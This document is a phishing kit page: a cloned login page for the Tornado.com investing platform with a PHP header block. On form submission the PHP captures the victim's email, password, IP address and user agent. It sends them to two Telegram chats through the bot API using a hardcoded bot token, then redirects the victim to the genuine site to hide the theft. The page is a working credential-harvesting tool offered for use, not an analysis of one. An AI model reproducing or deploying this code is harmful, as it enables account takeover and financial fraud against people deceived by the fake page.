<?php
ob_start();
$user = $_POST['email'];
$pass = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$tx = 'Login Details-----------------------------';

if(isset($_POST['btn_go'])){
    header("Location:https://tornado.com");
   
$token = "2120304127:AAEloTeGxYTjJ4hMVyyRe1dfFflyIAw-anA";
 

$chat_id = "2133483270";
$chat_id2 = "986643126";

$arr = array(
  '----------------------------------' => $tx,

  '📡Ip Address: ' => $ip,
  '🖥User Agent: ' => $useragent,
  '📗Email: ' => $user,
  '🔑Password: ' => $pass,
);
 

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};
 


$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id2}&parse_mode=html&text={$txt}","r");
}
ob_end_flush();
?><!DOCTYPE html><html lang="en" class="muted-light-color-scheme" data-scrapbook-source="https://tornado.com/app/login" data-scrapbook-create="20211206175939320" data-scrapbook-title="Tornado.com | Invest better"><head><style type="text/css">.ftscroller_container { overflow: hidden; position: relative; max-height: 100%; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); -ms-touch-action: none }
.ftscroller_hwaccelerated { transform: translateZ(0); }
.ftscroller_x, .ftscroller_y { position: relative; min-width: 100%; min-height: 100%; overflow: hidden }
.ftscroller_x { display: inline-block }
.ftscroller_scrollbar { pointer-events: none; position: absolute; width: 5px; height: 5px; border: 1px solid rgba(255, 255, 255, 0.3); -webkit-border-radius: 3px; border-radius: 6px; opacity: 0; transition: opacity 350ms; z-index: 10; -webkit-box-sizing: content-box; -moz-box-sizing: content-box; box-sizing: content-box }
.ftscroller_scrollbarx { bottom: 2px; left: 2px }
.ftscroller_scrollbary { right: 2px; top: 2px }
.ftscroller_scrollbarinner { height: 100%; background: #000; -webkit-border-radius: 2px; border-radius: 4px / 6px }
.ftscroller_scrollbar.active { opacity: 0.5; transition: none; -o-transition: all 0 none }</style>
    <meta charset="UTF-8">
    <title>Tornado.com | Invest better</title>
    <meta name="Description" content="Tornado gives you the insights &amp; community to turn your instincts into smart investing. Join today to sharpen your skills &amp; grow your gains.">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://tornado.com/">
    <meta property="og:title" content="Tornado.com | Invest better">
    <meta property="og:description" content="Tornado gives you the insights &amp; community to turn your instincts into smart investing.">
    <meta property="og:image" content="https://tornado.com/images/share-card.png">
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://tornado.com/">
    <meta property="twitter:title" content="Tornado.com | Invest better">
    <meta property="twitter:description" content="Tornado gives you the insights &amp; community to turn your instincts into smart investing.">
    <meta property="twitter:image" content="https://tornado.com/images/share-card.png">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta charset="UTF-8">

    <meta name="apple-itunes-app" content="app-id=1481266478, app-argument=nvstr">

    

    
    
    

    
    
    
    

    <link rel="icon" href="favicon-260.png">

    
    
    

    <link rel="stylesheet" href="index.css">
    <link rel="stylesheet" href="fontawesome.css">
    <link rel="stylesheet" href="main.css">
    <link rel="stylesheet" href="idea-lab.css">
    <link rel="stylesheet" href="idea-title.css">
    <link rel="stylesheet" href="info-card.css">

    <!-- Hotjar Tracking Code for https://tornado.com -->
    
  
  
<style data-styled="active" data-styled-version="5.3.0">.cDeaTy { display: flex; flex-direction: column; box-sizing: border-box; -webkit-box-align: center; align-items: center; -webkit-box-pack: center; justify-content: center; background: rgb(109, 86, 251); }
.kYyGja { inset: -10px auto auto; display: block; height: auto; width: auto; position: relative; }
.ckOpBs { inset: -2px auto auto; display: inline-block; height: auto; width: auto; padding: 0px 0px 0px 5px; position: relative; }
.gLfncW { inset: -10px 0px auto auto; display: block; height: auto; width: auto; position: absolute; }
.fxKZYs { box-sizing: border-box; line-height: 160%; font-size: 16px; }
.iAKUh g { fill: rgb(34, 34, 34); }
.emUvRB { border-radius: 4px; cursor: pointer; user-select: none; width: 200px; height: 64px; background: rgb(109, 86, 251); border: 2px solid rgb(109, 86, 251); transition: background-color 300ms ease 0s, color 300ms ease 0s; }
.emUvRB div { color: rgb(255, 255, 255); }
.emUvRB:hover { background: rgb(255, 255, 255); border: 2px solid rgb(109, 86, 251); }
.emUvRB:hover div { color: rgb(42, 43, 43); }
.dUAugf { height: 46px; color: rgb(42, 43, 43); border-radius: 4px; outline: none; font-size: 16px; margin: 0px 0px 16px; padding: 10px; border: 1px solid rgb(42, 43, 43); width: 100%; background: rgb(255, 255, 255); }
.dUAugf::-webkit-input-placeholder { color: rgb(204, 204, 204); }
.dUAugf::placeholder { color: rgb(204, 204, 204); }
.dUAugf:focus { border: 1px solid rgb(0, 0, 0); }
.fLibQH { position: relative; top: -20px; padding: 10px 0px; }
.cIJaKN { position: relative; top: 20px; padding: 0px; display: none; }
.bDNEth { position: absolute; top: 90px; }
.bNqXxX { position: relative; }
.diYjTw { position: absolute; left: 0px; height: 100vh; width: 50%; background: rgb(247, 244, 242); border-right: 1px solid rgba(0, 0, 0, 0.03); }
.fCfyBJ { position: absolute; left: 50%; height: 100vh; width: 50%; background: rgb(255, 255, 255); min-height: 780px; }
.carCnm { position: absolute; right: 0px; width: 440px; max-width: 440px; height: 100vh; padding: 60px 0px 0px 10px; }
.epdcqL { position: absolute; left: 0px; width: calc(100% - 48px); max-width: 540px; height: 100vh; padding: 125px 0px 0px 80px; }
.kjhMak { color: rgb(34, 34, 34); font-size: 30px; padding: 20px 0px 30px; font-weight: 500; }
.kjhMak b { font-family: Bolton-Bold; }
.ixnnOa { font-size: 18px; font-weight: 300; padding: 0px 80px 0px 0px; margin: 5px 0px 20px; line-height: 1.4em; }
.bWwHur { color: red; }
.bWwHur b { font-family: Bolton-Bold; }
.ksvBCj { color: rgb(34, 34, 34); font-size: 24px; font-weight: 800; padding: 42px 0px 25px; margin: 5px 0px 20px; line-height: 1.4em; }
.ixENpI { color: rgb(34, 34, 34); font-size: 14px; font-weight: 800; padding: 12px 0px 0px; line-height: 1.4em; }
.cDuRCe { position: relative; padding: 0px 0px 10px; width: 100%; max-width: 460px; }
.eQXenf { z-index: 10; position: absolute; left: 0px; right: 0px; top: 0px; width: 100vw; min-height: 100vh; }
@media only screen and (max-width: 900px) {
  .eQXenf { width: 100vw; max-width: 600px; margin: 0px auto; }
  .eQXenf .sc-gGuRsA { padding: 0px; }
  .eQXenf .sc-gGuRsA > div { position: relative; left: -20px; }
  .eQXenf .sc-hGwcmR { padding: 40px; }
  .eQXenf .sc-iueNdr { display: none; }
  .eQXenf .sc-dbXCOC { background: rgb(247, 244, 242); left: 0px; padding: 0px; width: 100%; }
  .eQXenf .sc-dbXCOC input[type="text"], .eQXenf .sc-dbXCOC input[type="email"], .eQXenf .sc-dbXCOC input[type="password"] { width: 100%; }
  .eQXenf .sc-dbXCOC .sc-hQYpqk { width: 100%; }
  .eQXenf .sc-dbXCOC .sc-cjzNjn { display: block; }
  .eQXenf .sc-igOmtu { top: 115px; }
}
@media only screen and (min-width: 801px) and (max-width: 920px) {
  .eQXenf { width: 920px; }
  .eQXenf .sc-hGwcmR { padding-left: 40px; }
}
@media only screen and (max-width: 450px) {
  .eQXenf .sc-hGwcmR { padding-top: 10px; width: 100vw; max-width: 100vw; }
}
@media only screen and (min-width: 920px) and (max-width: 1279px) {
  .eQXenf { width: 100vw; }
  .eQXenf .sc-hGwcmR { padding-left: 40px; }
}
@media only screen and (min-width: 801px) and (max-height: 720px) {
  .eQXenf .sc-ehALMs { padding-top: 35px; }
  .eQXenf .sc-hGwcmR { padding-top: 0px; }
}</style><style type="text/css">iframe#_hjRemoteVarsFrame {display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;}</style></head>

  <body cz-shortcut-listen="true">
    
    <div id="root"><div class="app-container drag-and-drop-container">
      <div class="sc-fTFMiz eQXenf"><div></div><div><div class="sc-iueNdr diYjTw">
        <div class="sc-ehALMs carCnm"><a href="/">
          <div class="sc-fyGvY fLibQH"><div class="sc-jrsJWt iAKUh">
            <svg width="184" height="21" viewBox="0 0 184 21" class="full-logo-tornado">
              <g fill="#1F1F1F" fill-rule="nonzero">
                <path d="M45.674 4.201v16.542h-4.55V4.201h-8.723V0h21.982v4.201h-8.71zm29.118 7.304v.153c0 5.732-3.2 9.21-10.838 9.21-7.638 0-10.865-3.492-10.865-9.21v-.153c0-5.731 3.227-9.21 10.865-9.21 7.624 0 10.838 3.492 10.838 9.21zm-4.591.126v-.098c0-3.812-1.934-5.133-6.26-5.133-4.327 0-6.261 1.321-6.261 5.133v.098c0 3.812 1.934 5.133 6.26 5.133 4.327.014 6.26-1.307 6.26-5.133zm18.587-9.335c.64 0 .946.027 1.35.125v4.535c-3.103-.71-8.404-.556-8.404 2.337v11.45h-4.577V2.421h4.577v6.024c0-3.144 1.837-6.15 7.054-6.15zm8.25 5.954c0-3.005 1.836-5.954 7.331-5.954 5.273 0 8.348 2.518 8.348 7.373v11.074h-4.578V10.24c0-2.393-1.502-3.965-5.467-3.965-2.727 0-5.62.557-5.62 2.825v11.658h-4.578V2.421h4.577V8.25h-.014zm23.205.96h-4.633v-.098c0-4.354 3.59-6.816 9.642-6.816 6.775 0 9.766 2.03 9.766 6.942v11.505h-4.549v-4.535c0 1.878-1.962 4.66-7.61 4.66-5.217 0-8.097-1.224-8.097-4.813v-.223c0-5.398 6.97-5.273 15.707-6.51v-.029c0-2.142-1.113-3.158-5.398-3.158-3.534 0-4.842 1.016-4.842 3.005v.07h.014zm3.13 8.653c3.618 0 7.096-.375 7.096-2.462v-2.616c-8.473.946-11.116 1.405-11.116 3.033v.098c0 1.21.974 1.947 4.02 1.947zM154.606 0h4.55v20.743h-4.55V15.61c0 2.337-1.934 5.272-7.665 5.272-6.776 0-9.516-3.687-9.516-9.238v-.097c0-5.55 2.754-9.238 9.516-9.238 5.731 0 7.665 2.922 7.665 5.273V0zm-6.218 6.135c-4.272 0-6.386 1.35-6.386 5.398v.098c0 4.048 2.114 5.398 6.386 5.398 3.255 0 6.204-.46 6.204-2.296V8.417c.014-1.823-2.949-2.282-6.204-2.282zm34.85 5.37v.153c0 5.732-3.2 9.21-10.838 9.21-7.638 0-10.865-3.492-10.865-9.21v-.153c0-5.731 3.227-9.21 10.865-9.21 7.624 0 10.838 3.492 10.838 9.21zm-4.591.126v-.098c0-3.812-1.934-5.133-6.261-5.133s-6.26 1.321-6.26 5.133v.098c0 3.812 1.933 5.133 6.26 5.133 4.327.014 6.261-1.307 6.261-5.133zM14.872 20.743c-.139-.556-.626-1.071-1.21-1.725-1.586-1.753-3.604-6.233 1.655-9.057C19.964 7.471 24.792 4.438 26.628 0H11.756c.139.556.626 1.071 1.21 1.725 1.586 1.753 3.604 6.233-1.655 9.057C6.664 13.272 1.822 16.305 0 20.743h14.872z"></path></g></svg></div></div></a><div class="sc-iuImSO kjhMak"> <b>TEACH YOUR MONEY</b><br> HOW TO MAKE MONEY</div><div class="sc-EhTUr ixnnOa"> Buy, sell, and trade with Tornado, the only investing platform that helps you invest in yourself.</div></div></div><div class="sc-dbXCOC fCfyBJ"><div class="sc-hGwcmR epdcqL"><div class="sc-Jgsit bNqXxX"><div class="sc-cjzNjn cIJaKN"><div class="sc-jrsJWt iAKUh"><svg width="184" height="21" viewBox="0 0 184 21" class="full-logo-tornado"><g fill="#1F1F1F" fill-rule="nonzero"><path d="M45.674 4.201v16.542h-4.55V4.201h-8.723V0h21.982v4.201h-8.71zm29.118 7.304v.153c0 5.732-3.2 9.21-10.838 9.21-7.638 0-10.865-3.492-10.865-9.21v-.153c0-5.731 3.227-9.21 10.865-9.21 7.624 0 10.838 3.492 10.838 9.21zm-4.591.126v-.098c0-3.812-1.934-5.133-6.26-5.133-4.327 0-6.261 1.321-6.261 5.133v.098c0 3.812 1.934 5.133 6.26 5.133 4.327.014 6.26-1.307 6.26-5.133zm18.587-9.335c.64 0 .946.027 1.35.125v4.535c-3.103-.71-8.404-.556-8.404 2.337v11.45h-4.577V2.421h4.577v6.024c0-3.144 1.837-6.15 7.054-6.15zm8.25 5.954c0-3.005 1.836-5.954 7.331-5.954 5.273 0 8.348 2.518 8.348 7.373v11.074h-4.578V10.24c0-2.393-1.502-3.965-5.467-3.965-2.727 0-5.62.557-5.62 2.825v11.658h-4.578V2.421h4.577V8.25h-.014zm23.205.96h-4.633v-.098c0-4.354 3.59-6.816 9.642-6.816 6.775 0 9.766 2.03 9.766 6.942v11.505h-4.549v-4.535c0 1.878-1.962 4.66-7.61 4.66-5.217 0-8.097-1.224-8.097-4.813v-.223c0-5.398 6.97-5.273 15.707-6.51v-.029c0-2.142-1.113-3.158-5.398-3.158-3.534 0-4.842 1.016-4.842 3.005v.07h.014zm3.13 8.653c3.618 0 7.096-.375 7.096-2.462v-2.616c-8.473.946-11.116 1.405-11.116 3.033v.098c0 1.21.974 1.947 4.02 1.947zM154.606 0h4.55v20.743h-4.55V15.61c0 2.337-1.934 5.272-7.665 5.272-6.776 0-9.516-3.687-9.516-9.238v-.097c0-5.55 2.754-9.238 9.516-9.238 5.731 0 7.665 2.922 7.665 5.273V0zm-6.218 6.135c-4.272 0-6.386 1.35-6.386 5.398v.098c0 4.048 2.114 5.398 6.386 5.398 3.255 0 6.204-.46 6.204-2.296V8.417c.014-1.823-2.949-2.282-6.204-2.282zm34.85 5.37v.153c0 5.732-3.2 9.21-10.838 9.21-7.638 0-10.865-3.492-10.865-9.21v-.153c0-5.731 3.227-9.21 10.865-9.21 7.624 0 10.838 3.492 10.838 9.21zm-4.591.126v-.098c0-3.812-1.934-5.133-6.261-5.133s-6.26 1.321-6.26 5.133v.098c0 3.812 1.933 5.133 6.26 5.133 4.327.014 6.261-1.307 6.261-5.133zM14.872 20.743c-.139-.556-.626-1.071-1.21-1.725-1.586-1.753-3.604-6.233 1.655-9.057C19.964 7.471 24.792 4.438 26.628 0H11.756c.139.556.626 1.071 1.21 1.725 1.586 1.753 3.604 6.233-1.655 9.057C6.664 13.272 1.822 16.305 0 20.743h14.872z"></path></g></svg></div></div><form method="post" id="snd" name="snd"><div class="sc-gVtoEh ksvBCj">Login</div><div class="sc-igOmtu bDNEth"><div class="sc-dwxYdI bWwHur"></div></div><input id="email-field" placeholder="Email" type="email" autocomplete="email" class="sc-fxFQKN dUAugf" name="email "value="" required=""><input id="password-field" placeholder="Password" type="password" autocomplete="current-password" class="sc-fxFQKN dUAugf" name="password"value="" required=""><div class="sc-hQYpqk cDuRCe"><div class="sc-hKFxyN kYyGja"> <input type="checkbox" id="checkbox" value="1" style="cursor: pointer;"><label for="checkbox" class="not-selectable" style="cursor: pointer;"><div display="inline-block" class="sc-hKFxyN ckOpBs">Keep me logged in</div></label></div><div class="sc-hKFxyN gLfncW"><a href="#">Forgot Password</a></div></div><button name="btn_go" style="border:0px solid black; background-color: transparent;"><div color="#fff" class="sc-dlnjwi sc-crzoAE cDeaTy emUvRB"><div font-size="16px" class="sc-pNWdM fxKZYs">Sign In</div></button></div><div class="sc-hJFzke ixENpI">Don't have an account? <a href="https://tornado.com/app/signup">Sign Up</a></div></form></div></div></div></div></div></div></div>
    
  

</body></html>